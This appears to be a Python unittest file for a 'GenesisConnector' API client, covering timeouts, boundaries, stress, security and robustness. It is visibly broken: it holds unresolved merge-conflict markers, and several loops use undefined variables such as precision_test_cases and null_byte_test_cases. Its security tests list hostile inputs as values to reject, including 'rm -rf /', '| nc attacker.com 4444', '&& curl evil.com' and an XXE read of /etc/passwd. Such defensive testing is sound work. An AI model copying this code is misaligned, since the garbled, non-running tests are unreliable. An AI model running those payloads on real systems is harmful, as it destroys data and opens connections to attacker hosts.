        """Test various timeout scenarios."""
        timeout_exceptions = [
            Timeout("Read timeout"),
            Timeout("Connection timeout"),
            requests.exceptions.ReadTimeout("Read timeout"),
            requests.exceptions.ConnectTimeout("Connect timeout")
        ]

        for exception in timeout_exceptions:
            with self.subTest(exception=type(exception).__name__):
                mock_request.side_effect = exception

                with self.assertRaises(GenesisTimeoutError):
                    self.connector.make_request('GET', '/test')

    @patch('requests.Session.request')
    def test_generation_workflow_complete(self, mock_request):
        """Test complete generation workflow from creation to completion."""
        # Mock responses for the complete workflow
        create_response = Mock()
        create_response.status_code = 201
        create_response.json.return_value = {'id': 'gen_123', 'status': 'pending'}
        create_response.raise_for_status.return_value = None

        status_pending_response = Mock()
        status_pending_response.status_code = 200
        status_pending_response.json.return_value = {'id': 'gen_123', 'status': 'running'}
        status_pending_response.raise_for_status.return_value = None

        status_complete_response = Mock()
        status_complete_response.status_code = 200
        status_complete_response.json.return_value = {
            'id': 'gen_123',
            'status': 'completed',
            'result': 'Generated content'
        }
        status_complete_response.raise_for_status.return_value = None

        mock_request.side_effect = [
            create_response,
            status_pending_response,
            status_complete_response
        ]

        # Test complete workflow
        generation_request = {'prompt': 'Test prompt', 'model': 'test_model'}

        # Create generation
        create_result = self.connector.create_generation(generation_request)
        self.assertEqual(create_result['id'], 'gen_123')
        self.assertEqual(create_result['status'], 'pending')

        # Check status (running)
        status_result = self.connector.get_generation_status('gen_123')
        self.assertEqual(status_result['status'], 'running')

        # Check status (completed)
        final_result = self.connector.get_generation_status('gen_123')
        self.assertEqual(final_result['status'], 'completed')
        self.assertEqual(final_result['result'], 'Generated content')

    @patch('requests.Session.request')
    def test_model_operations_comprehensive(self, mock_request):
        """Test comprehensive model operations."""
        # List models
        list_response = Mock()
        list_response.status_code = 200
        list_response.json.return_value = {
            'models': [
                {'id': 'model_1', 'name': 'Model 1', 'status': 'active'},
                {'id': 'model_2', 'name': 'Model 2', 'status': 'inactive'}
            ]
        }
        list_response.raise_for_status.return_value = None

        # Get specific model
        model_response = Mock()
        model_response.status_code = 200
        model_response.json.return_value = {
            'id': 'model_1',
            'name': 'Model 1',
            'status': 'active',
            'capabilities': ['text-generation', 'summarization']
        }
        model_response.raise_for_status.return_value = None

        mock_request.side_effect = [list_response, model_response]

        # Test list models
        models = self.connector.list_models()
        self.assertEqual(len(models['models']), 2)

        # Test get specific model
        model_info = self.connector.get_model_info('model_1')
        self.assertEqual(model_info['id'], 'model_1')
        self.assertIn('capabilities', model_info)

    def test_logging_integration(self):
        """Test logging integration and log messages."""
        import logging

        # Set up log capture
        log_capture = []

        class TestHandler(logging.Handler):
            def emit(self, record):
                log_capture.append(record)

        # Add test handler to logger
        logger = logging.getLogger('genesis_connector')
        test_handler = TestHandler()
        logger.addHandler(test_handler)
        logger.setLevel(logging.DEBUG)

        try:
            # Create connector (should log initialization)
            connector = GenesisConnector(self.mock_config)

            # Check if any logs were captured
            # Note: This depends on actual logging in the implementation
            self.assertIsNotNone(connector)

        finally:
            # Clean up
            logger.removeHandler(test_handler)

    def test_session_persistence(self):
        """Test that HTTP session is properly managed."""
        # Test that session is reused across requests
        self.assertIsNotNone(self.connector.session)

        # Session should be the same instance across calls
        session1 = self.connector.session
        session2 = self.connector.session
        self.assertIs(session1, session2)

    @patch('requests.Session.request')
    def test_error_message_preservation(self, mock_request):
        """Test that error messages are properly preserved through the error handling chain."""
        original_error_message = "Very specific error message with details"

        mock_response = Mock()
        mock_response.status_code = 400
        mock_response.text = original_error_message
        mock_response.raise_for_status.side_effect = requests.HTTPError("400 Bad Request")
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        # Original error message should be preserved
        error_str = str(context.exception)
        self.assertIn(original_error_message, error_str)

    def test_config_validation_comprehensive(self):
        """Test comprehensive configuration validation."""
        # Test various invalid configurations
        invalid_configs = [
            ({'api_key': 123}, "API key must be string"),
            ({'api_key': 'valid', 'base_url': 123}, "Base URL must be string"),
            ({'api_key': 'valid', 'timeout': 'invalid'}, "Timeout must be number"),
            ({'api_key': 'valid', 'max_retries': 'invalid'}, "Max retries must be number"),
            ({'api_key': 'valid', 'base_url': 'ftp://invalid'}, "Invalid protocol"),
        ]

        for config, expected_error in invalid_configs:
            with self.subTest(config=config):
                with self.assertRaises(ValueError) as context:
                    GenesisConnector(config)
                # Note: This depends on actual validation in the implementation


class TestGenesisConnectorPerformance(unittest.TestCase):
    """Performance and load testing for GenesisConnector."""

    def setUp(self):
        """Set up performance test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('requests.Session.request')
    def test_rapid_sequential_requests(self, mock_request):
        """Test rapid sequential request performance."""
        import time

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        num_requests = 100
        start_time = time.time()

        for i in range(num_requests):
            result = self.connector.make_request('GET', f'/test/{i}')
            self.assertEqual(result, {'success': True})
>>>>>>> pr458merge
        
        end_time = time.time()
        total_time = end_time - start_time
        
<<<<<<< HEAD
        # All requests should complete
        self.assertEqual(len(results), 50)
        
        # Should complete within reasonable time
        self.assertLess(total_time, 5.0)  # Less than 5 seconds

    def test_memory_leak_detection(self):
        """
        Verify that repeated payload formatting and header generation do not result in significant memory leaks by checking object count stability after garbage collection.
        """
        import gc
        import sys
        
        # Force garbage collection
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Perform many operations
        for i in range(100):
            try:
                payload = {'iteration': i, 'data': list(range(100))}
                formatted = self.connector.format_payload(payload)
                
                # Simulate some processing
                headers = self.connector.get_headers()
                
                # Clean up explicitly
                del payload, formatted, headers
                
            except Exception:
                # Expected for some edge cases
                pass
        
        # Force garbage collection again
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Object count should not grow significantly
        object_growth = final_objects - initial_objects
        self.assertLess(object_growth, 50)  # Allow some growth but not excessive


class TestGenesisConnectorBoundaryConditions(unittest.TestCase):
    """
    Boundary condition tests for GenesisConnector class.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """
        Set up the test fixture for boundary condition tests by initializing a GenesisConnector instance.
        """
        self.connector = GenesisConnector()

    def test_extremely_long_api_key(self):
        """
        Tests whether the connector correctly handles configuration validation with an extremely long API key.
        
        Verifies that the connector either accepts a very long API key or raises a ValueError if the key length exceeds acceptable limits.
        """
        long_key = 'a' * 10000  # 10KB API key
        config = {
            'api_key': long_key,
            'base_url': 'https://api.test.com'
        }
        
        # Should handle long keys appropriately
        try:
            result = self.connector.validate_config(config)
            self.assertIsInstance(result, bool)
        except ValueError:
            # Expected for excessively long keys
            pass

    def test_maximum_timeout_values(self):
        """
        Tests configuration validation for timeout values at boundary conditions, including zero, large positive integers, and infinity, ensuring valid values are accepted and invalid ones raise errors.
        """
        extreme_timeouts = [
            0,  # Minimum
            1,  # Very short
            86400,  # 24 hours
            float('inf'),  # Infinity
            float('-inf'), # Negative infinity
        ]
        
        for value in precision_test_cases:
            with self.subTest(value=value):
                payload = {'precision_value': value, 'message': 'precision_test'}
                

                try:
                    result = self.connector.validate_config(config)
                    # If validation passes, timeout should be reasonable
                    if result:
                        self.assertGreaterEqual(timeout, 0)
                except (ValueError, OverflowError):
                    # Expected for invalid timeout values
                    pass

    def test_url_length_boundaries(self):
        """
        Tests that configuration validation accepts base URLs within acceptable length limits and raises a ValueError for excessively long URLs.
        """
        base_url = 'https://api.test.com'
        
        # Test with increasingly long URLs
        for length in [100, 1000, 2000, 8000]:  # Common URL length limits
            with self.subTest(length=length):
                long_path = 'a' * (length - len(base_url) - 1)
                long_url = f"{base_url}/{long_path}"
                
                config = {
                    'api_key': 'test',
                    'base_url': long_url
                }
                
                try:
                    result = self.connector.validate_config(config)
                    self.assertIsInstance(result, bool)
                except ValueError:
                    # Expected for excessively long URLs
                    pass

    def test_payload_size_boundaries(self):
        """
        Test that payload formatting handles payloads from empty to 10MB, raising errors on empty payloads and successfully formatting valid payloads at various size boundaries.
        """
        sizes = [0, 1, 1024, 1024*1024, 10*1024*1024]  # 0B, 1B, 1KB, 1MB, 10MB
        
        for size in sizes:
            with self.subTest(size=size):
                if size == 0:
                    payload = {}
                else:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)

    def test_unicode_boundary_conditions(self):
        """
        Test that payload formatting handles various Unicode strings, including control characters, boundary code points, and emojis, by either processing them successfully or raising a ValueError if unsupported.
        """
        unicode_test_cases = [
            'Basic ASCII',
            'Café with accents',
            '测试中文字符',
            '🚀🌟💫 Emojis',
            'Mixed: ASCII + café + 测试 + 🚀',
            '\u0000\u0001\u0002',  # Control characters
            '\uffff\ufffe\ufffd',  # Unicode boundaries
        ]
        
        for test_string in null_byte_test_cases:
            with self.subTest(test_string=test_string):
                payload = {'message': test_string}
                
                # Should either handle gracefully or raise appropriate error
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except ValueError:
                    # Acceptable to reject null bytes
                    pass


    def test_numeric_boundary_conditions(self):
        """
        Test formatting of payloads containing numeric boundary values, including extreme integers and floating-point values, to ensure correct serialization or proper exception handling.
        """
        import sys
        
        numeric_test_cases = [
            0,
            1,
            -1,
            sys.maxsize,
            -sys.maxsize - 1,
            float('inf'),
            float('-inf'),
            float('nan'),
            1e308,  # Near float max
            1e-308,  # Near float min
        ]
        
        for number in numeric_test_cases:
            with self.subTest(number=number):
                payload = {'number': number, 'message': 'test'}
                
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except (ValueError, OverflowError):
                    # Expected for some boundary cases
                    pass


if __name__ == '__main__':
    # Run all tests
    unittest.main(verbosity=2)

class TestGenesisConnectorAdvancedSecurity(unittest.TestCase):
    """
    Advanced security tests for GenesisConnector.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up security test environment."""
        self.connector = GenesisConnector()

    def test_header_injection_prevention(self):
        """Test prevention of HTTP header injection attacks."""
        malicious_headers = [
            'test\r\nX-Injected: malicious',
            'test\nX-Injected: malicious',
            'test\r\n\r\nX-Injected: malicious',
            'test\x00X-Injected: malicious',
        ]
        
        for malicious_value in malicious_headers:
            with self.subTest(value=malicious_value):
                config = {
                    'api_key': malicious_value,
                    'base_url': 'https://test.com',
                    'custom_headers': {'X-Test': malicious_value}
                }
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_command_injection_prevention(self):
        """Test prevention of command injection in configuration."""
        command_injection_payloads = [
            '; rm -rf /',
            '$(rm -rf /)',
            '`rm -rf /`',
            '| nc attacker.com 4444',
            '&& curl evil.com',
        ]
        
        for payload in command_injection_payloads:
            with self.subTest(payload=payload):
                config = {
                    'api_key': f'test{payload}',
                    'base_url': f'https://test.com{payload}'
                }
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection patterns."""
        ldap_payloads = [
            'test*)(uid=*))(|(uid=*',
            'test*)((|uid=*))',
            'test*)(objectClass=*',
        ]
        
        for payload in ldap_payloads:
            with self.subTest(payload=payload):
                config = {'api_key': payload, 'base_url': 'https://test.com'}
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_xml_injection_prevention(self):
        """Test prevention of XML injection attacks."""
        xml_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '&xxe;',
            ']]><!ENTITY xxe SYSTEM "http://evil.com">',
        ]
        
        for payload in xml_payloads:
            with self.subTest(payload=payload):
                config = {'api_key': payload, 'base_url': 'https://test.com'}
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_protocol_downgrade_prevention(self):
        """Test prevention of protocol downgrade attacks."""
        insecure_urls = [
            'http://api.test.com',  # HTTP instead of HTTPS
            'ftp://api.test.com',
            'file:///etc/passwd',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
        ]
        
        for url in insecure_urls:
            with self.subTest(url=url):
                config = {'api_key': 'test', 'base_url': url}
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    @patch('requests.post')
    def test_response_size_limits(self, mock_post):
        """Test handling of extremely large responses."""
        # Simulate very large response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {'Content-Length': '100000000'}  # 100MB
        mock_response.content = b'x' * (10 * 1024 * 1024)  # 10MB actual content
        mock_post.return_value = mock_response
        
        payload = {'message': 'size_test'}
        
        try:
            result = self.connector.send_request(payload)
            # Should handle large responses appropriately
            self.assertIsNotNone(result)
        except (MemoryError, ValueError) as e:
            # Acceptable to reject overly large responses
            self.assertIsInstance(e, (MemoryError, ValueError))

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks in validation."""
        import time
        
        valid_config = {
            'api_key': 'valid_key_12345',
            'base_url': 'https://api.test.com'
        }
        
        invalid_configs = [
            {'api_key': 'a', 'base_url': 'https://api.test.com'},
            {'api_key': 'invalid_key_12345', 'base_url': 'https://api.test.com'},
            {'api_key': '', 'base_url': 'https://api.test.com'},
        ]
        
        # Measure validation timing
        valid_times = []
        invalid_times = []
        
        for _ in range(10):
            start = time.time()
            try:
                self.connector.validate_config(valid_config)
            except:
                pass
            valid_times.append(time.time() - start)
            
            for invalid_config in invalid_configs:
                start = time.time()
                try:
                    self.connector.validate_config(invalid_config)
                except:
                    pass
                invalid_times.append(time.time() - start)
        
        # Timing differences should not be significant (basic timing attack resistance)
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        
        # Allow some variance but not orders of magnitude
        self.assertLess(abs(avg_valid - avg_invalid), avg_valid * 2)


class TestGenesisConnectorStressTests(unittest.TestCase):
    """
    Stress tests for GenesisConnector to test limits and stability.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up stress test environment."""
        self.connector = GenesisConnector(config={
            'api_key': 'stress_test_key',
            'base_url': 'https://api.test.com'
        })

    def test_rapid_successive_requests(self):
        """Test handling of rapid successive requests."""
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'success': True}
            mock_post.return_value = mock_response
            
            # Make 1000 rapid requests
            for i in range(1000):
                payload = {'request_id': i, 'message': 'rapid_test'}
                result = self.connector.send_request(payload)
                self.assertEqual(result['success'], True)

    def test_memory_stress_with_large_payloads(self):
        """Test memory handling with multiple large payloads."""
        import gc
        
        # Force garbage collection before test
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        large_payloads = []
        for i in range(50):
            payload = {
                'id': i,
                'large_data': 'x' * (1024 * 100),  # 100KB each
                'list_data': list(range(1000)),
                'nested': {'deep': {'data': list(range(100))}}
            }
            large_payloads.append(payload)
        
        # Process all payloads
        for payload in large_payloads:
            try:
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
            except MemoryError:
                # Acceptable under extreme memory pressure
                pass
        
        # Clean up and check memory
        del large_payloads
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Should not leak excessive objects
        object_growth = final_objects - initial_objects
        self.assertLess(object_growth, 100)

    @patch('requests.post')
    def test_error_recovery_stress(self, mock_post):
        """Test error recovery under stress conditions."""
        error_types = [
            ConnectionError("Connection failed"),
            TimeoutError("Request timeout"),
            ValueError("Invalid response"),
            RuntimeError("Server error"),
            MemoryError("Out of memory"),
        ]
        
        success_count = 0
        error_count = 0
        
        for i in range(100):
            # Randomly inject errors
            if i % 10 == 0:
                mock_post.side_effect = error_types[i % len(error_types)]
            else:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {'id': i}
                mock_post.side_effect = None
                mock_post.return_value = mock_response
            
            payload = {'test_id': i}
            try:
                result = self.connector.send_request(payload)
                success_count += 1
            except Exception:
                error_count += 1
        
        # Should handle most requests successfully despite errors
        self.assertGreater(success_count, error_count)

    def test_configuration_reload_stress(self):
        """Test stress testing configuration reloads."""
        import threading
        import time
        
        def config_reloader():
            for i in range(100):
                new_config = {
                    'api_key': f'stress_key_{i}',
                    'base_url': f'https://api{i % 5}.test.com',
                    'timeout': 30 + (i % 60)
                }
                try:
                    self.connector.reload_config(new_config)
                    time.sleep(0.001)  # Small delay
                except Exception:
                    pass
        
        def request_sender():
            for i in range(50):
                with patch('requests.post') as mock_post:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'id': i}
                    mock_post.return_value = mock_response
                    
                    try:
                        result = self.connector.send_request({'id': i})
                    except Exception:
                        pass
                    time.sleep(0.002)
        
        # Run config reloads and requests concurrently
        threads = [
            threading.Thread(target=config_reloader),
            threading.Thread(target=request_sender),
            threading.Thread(target=request_sender),
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should survive concurrent operations
        self.assertIsNotNone(self.connector.config)

    def test_deep_recursion_handling(self):
        """Test handling of deeply nested data structures."""
        # Create deeply nested structure
        nested_data = {'level': 0}
        current = nested_data
        
        for i in range(100):  # 100 levels deep
            current['next'] = {'level': i + 1}
            current = current['next']
        
        current['final'] = 'deep_data'
        
        try:
            formatted = self.connector.format_payload(nested_data)
            self.assertIsNotNone(formatted)
        except (RecursionError, ValueError) as e:
            # Acceptable to reject overly deep structures
            self.assertIsInstance(e, (RecursionError, ValueError))

    def test_concurrent_operations_stress(self):
        """Test stress with many concurrent operations."""
        import concurrent.futures
        import threading
        
        results = []
        errors = []
        
        def worker(worker_id):
            try:
                with patch('requests.post') as mock_post:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'worker': worker_id}
                    mock_post.return_value = mock_response
                    
                    # Multiple operations per worker
                    for i in range(10):
                        payload = {'worker': worker_id, 'iteration': i}
                        result = self.connector.send_request(payload)
                        results.append(result)
                        
                        # Also test other operations
                        headers = self.connector.get_headers()
                        formatted = self.connector.format_payload(payload)
                        
            except Exception as e:
                errors.append(e)
        
        # Run many concurrent workers
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(worker, i) for i in range(50)]
            for future in futures:
                future.result()
        
        # Most operations should succeed
        self.assertGreater(len(results), len(errors) * 5)


class TestGenesisConnectorDataValidation(unittest.TestCase):
    """
    Enhanced data validation tests for GenesisConnector.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up data validation test environment."""
        self.connector = GenesisConnector()

    def test_json_schema_validation(self):
        """Test validation against JSON schema patterns."""
        valid_payloads = [
            {'message': 'test', 'timestamp': '2024-01-01T00:00:00Z'},
            {'data': [1, 2, 3], 'metadata': {'key': 'value'}},
            {'nested': {'deep': {'data': 'value'}}},
        ]
        
        for payload in valid_payloads:
            with self.subTest(payload=payload):
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)

    def test_data_type_coercion(self):
        """Test handling of various data type combinations."""
        mixed_payload = {
            'string': 'test',
            'integer': 42,
            'float': 3.14159,
            'boolean': True,
            'none_value': None,
            'list': [1, 'two', 3.0, True],
            'dict': {'nested': {'value': 123}},
            'bytes': b'binary_data',
            'set': {1, 2, 3},  # Non-JSON serializable
            'tuple': (1, 2, 3),  # Non-JSON serializable
        }
        
        try:
            formatted = self.connector.format_payload(mixed_payload)
            self.assertIsNotNone(formatted)
            
            # Verify that non-serializable types are handled
            self.assertIn('string', formatted)
            self.assertIn('integer', formatted)
            
        except (ValueError, TypeError) as e:
            # Acceptable to reject non-serializable data
            self.assertIsInstance(e, (ValueError, TypeError))

    def test_encoding_handling(self):
        """Test handling of various character encodings."""
        encoding_test_cases = [
            'ASCII text',
            'UTF-8: café, naïve, résumé',
            'Cyrillic: Привет мир',
            'Arabic: مرحبا بالعالم',
            'Chinese: 你好世界',
            'Japanese: こんにちは世界',
            'Emoji: 🌍🚀💫⭐',
            'Mixed: Hello 世界 🌍',
        ]
        
        for text in encoding_test_cases:
            with self.subTest(text=text):
                payload = {'message': text, 'description': f'Testing: {text}'}
                
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
                self.assertIn('message', formatted)

    def test_whitespace_handling(self):
        """Test handling of various whitespace characters."""
        whitespace_cases = [
            'normal spaces',
            'tabs\tand\ttabs',
            'newlines\nand\nmore\nnewlines',
            'carriage\rreturns',
            'mixed\t\n\r whitespace',
            '   leading spaces',
            'trailing spaces   ',
            '   both sides   ',
            '',  # empty string
            '   ',  # only spaces
            '\t\n\r',  # only whitespace chars
        ]
        
        for text in whitespace_cases:
            with self.subTest(text=repr(text)):
                payload = {'message': text, 'test': 'whitespace'}
                
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except ValueError:
                    # May reject empty/whitespace-only content
                    if not text.strip():
                        pass  # Acceptable for empty content
                    else:
                        raise

    def test_boundary_value_validation(self):
        """Test validation of boundary values for different data types."""
        import sys
        from decimal import Decimal
        
        boundary_values = [
            # Integer boundaries
            0, 1, -1, sys.maxsize, -sys.maxsize - 1,
            # Float boundaries  
            0.0, 1.0, -1.0, float('inf'), float('-inf'), float('nan'),
            # String boundaries
            '', 'a', 'a' * 1000, 'a' * 10000,
            # Special numeric values
            Decimal('0'), Decimal('999999999999.999999999999'),
            # Complex numbers
            complex(0, 0), complex(1, 1), complex(-1, -1),
        ]
        
        for value in boundary_values:
            with self.subTest(value=repr(value)):
                payload = {'boundary_value': value, 'type': type(value).__name__}
                
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except (ValueError, OverflowError, TypeError) as e:
                    # Some boundary values may not be serializable
                    self.assertIsInstance(e, (ValueError, OverflowError, TypeError))


class TestGenesisConnectorAdvancedIntegration(unittest.TestCase):
    """
    Advanced integration tests for complex scenarios.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up advanced integration test environment."""
        self.connector = GenesisConnector(config={
            'api_key': 'integration_test_key',
            'base_url': 'https://api.integration.test.com',
            'timeout': 30
        })

    @patch('requests.get')
    @patch('requests.post')
    def test_full_workflow_with_retries(self, mock_post, mock_get):
        """Test complete workflow with connection, requests, and retries."""
        # Setup connection mock
        mock_get_response = Mock()
        mock_get_response.status_code = 200
        mock_get_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_get_response
        
        # Setup request mocks with initial failures then success
        mock_post_responses = [
            Mock(status_code=500),  # First attempt fails
            Mock(status_code=502),  # Second attempt fails
            Mock(status_code=200),  # Third attempt succeeds
        ]
        mock_post_responses[2].json.return_value = {'data': 'workflow_success'}
        mock_post.side_effect = mock_post_responses
        
        # Execute workflow
        connected = self.connector.connect()
        self.assertTrue(connected)
        
        payload = {'workflow': 'integration_test', 'data': 'test_data'}
        
        try:
            result = self.connector.send_request_with_retry(payload, max_retries=3)
            self.assertEqual(result['data'], 'workflow_success')
            self.assertEqual(mock_post.call_count, 3)  # Should retry twice then succeed
        except AttributeError:
            # If retry method doesn't exist, test regular send
            with self.assertRaises(RuntimeError):
                self.connector.send_request(payload)

    @patch('requests.get')
    def test_status_monitoring_integration(self, mock_get):
        """Test integration of status monitoring with error handling."""
        status_responses = [
            {'status': 'healthy', 'version': '1.0'},
            {'status': 'degraded', 'issues': ['high_latency']},
            {'status': 'unhealthy', 'error': 'service_down'},
        ]
        
        for i, status_data in enumerate(status_responses):
            with self.subTest(status=status_data['status']):
                mock_response = Mock()
                mock_response.status_code = 200 if status_data['status'] != 'unhealthy' else 503
                mock_response.json.return_value = status_data
                mock_get.return_value = mock_response
                
                status = self.connector.get_status()
                self.assertEqual(status['status'], status_data['status'])

    def test_configuration_management_integration(self):
        """Test integration of configuration management across operations."""
        configs = [
            {'api_key': 'key1', 'base_url': 'https://api1.test.com', 'timeout': 30},
            {'api_key': 'key2', 'base_url': 'https://api2.test.com', 'timeout': 60},
            {'api_key': 'key3', 'base_url': 'https://api3.test.com', 'timeout': 90},
        ]
        
        for i, config in enumerate(configs):
            with self.subTest(config_id=i):
                # Update configuration
                self.connector.reload_config(config)
                
                # Verify configuration is applied
                self.assertEqual(self.connector.config['api_key'], config['api_key'])
                
                # Test that headers reflect new config
                headers = self.connector.get_headers()
                if 'api_key' in config:
                    self.assertIn('Authorization', headers)
                
                # Test that validation works with new config
                is_valid = self.connector.validate_config(config)
                self.assertTrue(is_valid)

    @patch('requests.post')
    def test_payload_processing_pipeline(self, mock_post):
        """Test integration of payload formatting and processing."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'processed': True}
        mock_post.return_value = mock_response
        
        # Test complex payload pipeline
        raw_data = {
            'user_input': 'Test message with special chars: <>&"\'',
            'timestamp': datetime.now(),
            'metadata': {
                'source': 'integration_test',
                'version': '1.0',
                'nested': {
                    'deep_data': list(range(100)),
                    'more_nested': {'key': 'value'}
                }
            },
            'binary_data': b'some_binary_content',
            'numbers': [1, 2.5, Decimal('3.14'), complex(1, 2)]
        }
        
        # Format payload
        formatted = self.connector.format_payload(raw_data)
        self.assertIsNotNone(formatted)
        
        # Send formatted payload
        result = self.connector.send_request(formatted)
        self.assertEqual(result['processed'], True)
        
        # Verify the payload was properly formatted in the request
        call_args = mock_post.call_args
        self.assertIsNotNone(call_args)

    def test_error_handling_integration(self):
        """Test integration of error handling across different components."""
        error_scenarios = [
            # Configuration errors
            ({'api_key': '', 'base_url': 'invalid'}, ValueError),
            # Payload errors  
            ({}, ValueError),  # Empty payload
            # Network simulation will be handled separately
        ]
        
        for config_or_payload, expected_error in error_scenarios:
            with self.subTest(data=config_or_payload):
                if 'api_key' in config_or_payload:
                    # Configuration error test
                    with self.assertRaises(expected_error):
                        self.connector.validate_config(config_or_payload)
                else:
                    # Payload error test
                    with self.assertRaises(expected_error):
                        self.connector.format_payload(config_or_payload)


class TestGenesisConnectorRobustness(unittest.TestCase):
    """
    Robustness tests for GenesisConnector resilience.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up robustness test environment."""
        self.connector = GenesisConnector()

    def test_malformed_response_handling(self):
        """Test handling of various malformed server responses."""
        malformed_responses = [
            # Incomplete JSON
            '{"incomplete":',
            '{"key": "value"',
            '{"key": "value",}',  # Trailing comma
            # Invalid JSON structures
            '{key: "value"}',  # Unquoted key
            "{'key': 'value'}",  # Single quotes
            '{"key": undefined}',  # JavaScript undefined
            # Mixed content
            'text before {"key": "value"}',
            '{"key": "value"} text after',
            # Control characters
            '{"key": "value\x00"}',
            '{"key": "value\x1f"}',
            # Invalid escape sequences
            '{"key": "\\uXXXX"}',
            '{"key": "\\invalid"}',
        ]
        
        for response_text in malformed_responses:
            with self.subTest(response=response_text):
                try:
                    parsed = self.connector.parse_response(response_text)
                    # If parsing succeeds, verify result is reasonable
                    self.assertIsNotNone(parsed)
                except (ValueError, json.JSONDecodeError) as e:
                    # Expected for malformed JSON
                    self.assertIsInstance(e, (ValueError, json.JSONDecodeError))

    def test_resource_exhaustion_handling(self):
        """Test handling when system resources are exhausted."""
        # Test file descriptor exhaustion simulation
        with patch('requests.post') as mock_post:
            mock_post.side_effect = OSError("Too many open files")
            
            payload = {'message': 'resource_test'}
            
            with self.assertRaises(OSError):
                self.connector.send_request(payload)

        # Test memory exhaustion simulation
        with patch.object(self.connector, 'format_payload') as mock_format:
            mock_format.side_effect = MemoryError("Cannot allocate memory")
            
            payload = {'message': 'memory_test'}
            
            with self.assertRaises(MemoryError):
                self.connector.format_payload(payload)

    def test_network_partition_handling(self):
        """Test behavior during network partitions."""
        network_errors = [
            ConnectionError("Network is unreachable"),
            TimeoutError("Connection timeout"),
            OSError("Network is down"),
            socket.gaierror("Name or service not known"),
        ]
        
        for error in network_errors:
            with self.subTest(error=error.__class__.__name__):
                with patch('requests.post') as mock_post:
                    mock_post.side_effect = error
                    
                    payload = {'message': 'network_test'}
                    
                    with self.assertRaises(Exception):
                        self.connector.send_request(payload)

    def test_concurrent_modification_handling(self):
        """Test handling of concurrent modifications to connector state."""
        import threading
        import time
        
        results = []
        errors = []
        
        def config_modifier():
            """Continuously modify configuration."""
            for i in range(50):
                try:
                    new_config = {
                        'api_key': f'concurrent_key_{i}',
                        'base_url': f'https://api{i % 3}.test.com'
                    }
                    self.connector.reload_config(new_config)
                    time.sleep(0.001)
                except Exception as e:
                    errors.append(e)

        def operation_executor():
            """Execute operations while config is being modified."""
            for i in range(30):
                try:
                    # Try various operations
                    headers = self.connector.get_headers()
                    current_config = self.connector.config
                    
                    payload = {'concurrent_test': i}
                    formatted = self.connector.format_payload(payload)
                    
                    results.append({'headers': headers, 'config': current_config})
                    time.sleep(0.002)
                except Exception as e:
                    errors.append(e)

        # Run concurrent operations
        threads = [
            threading.Thread(target=config_modifier),
            threading.Thread(target=operation_executor),
            threading.Thread(target=operation_executor),
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should handle concurrent access gracefully
        # Allow some errors but not excessive
        self.assertLess(len(errors), len(results))

    def test_graceful_degradation(self):
        """Test graceful degradation when optional features fail."""
        # Test when logging fails
        with patch('logging.info') as mock_log:
            mock_log.side_effect = Exception("Logging failed")
            
            payload = {'message': 'log_test'}
            
            try:
                # Should continue working even if logging fails
                self.connector.log_request(payload)
            except Exception:
                # May raise exception, but should be handled gracefully
                pass

        # Test when metrics collection fails
        with patch.object(self.connector, 'get_metrics', side_effect=Exception("Metrics failed")):
            try:
                metrics = self.connector.get_metrics()
            except (Exception, AttributeError):
                # Graceful degradation - metrics are optional
                pass

    def test_state_corruption_recovery(self):
        """Test recovery from state corruption scenarios."""
        # Corrupt internal state
        original_config = self.connector.config.copy() if hasattr(self.connector, 'config') else {}
        
